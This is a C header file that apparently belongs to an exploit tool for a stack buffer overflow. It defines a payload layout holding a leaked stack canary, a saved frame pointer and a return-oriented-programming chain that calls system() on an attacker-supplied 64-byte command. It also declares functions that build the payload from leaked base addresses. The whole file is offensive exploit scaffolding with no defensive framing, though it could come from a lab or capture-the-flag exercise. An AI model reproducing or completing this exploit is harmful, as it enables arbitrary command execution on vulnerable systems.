#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_
#include "addresses.h"

typedef struct Payload {
        // Stack frame contents at lower addresses than the RET data
	AddressUnion	pl_dst;
	AddressUnion	pl_canary;
	AddressUnion	pl_rbp;

        // THE OVERFLOW FUNCTION WILL RETURN TO THE NEXT VARIABLE IN THIS STRUCTURE

        // ROP chain for "system(pl_bss)"
        AddressUnion    pl_popRDI;
        AddressUnion    pl_systemArg;
        AddressUnion    pl_popRAX;
        long            pl_zero;
        AddressUnion    pl_system;
        char            pl_arg[64];
} Payload, *PayloadPtr;

extern void	initload(PayloadPtr plp);
extern ssize_t	makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np);
extern void	dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr);

#endif
